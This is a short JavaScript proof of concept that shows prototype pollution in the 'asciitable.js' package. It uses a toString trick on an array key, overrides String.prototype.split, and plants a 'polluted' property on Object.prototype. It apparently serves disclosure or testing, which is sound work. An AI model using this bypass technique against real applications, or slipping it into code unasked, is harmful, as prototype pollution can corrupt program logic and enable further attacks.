var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
console.log({}.polluted);
const req = require('asciitable.js');
const b = JSON.parse('{"__proto__":{"polluted":"yes"}}');
req({}, b);
console.log({}.polluted);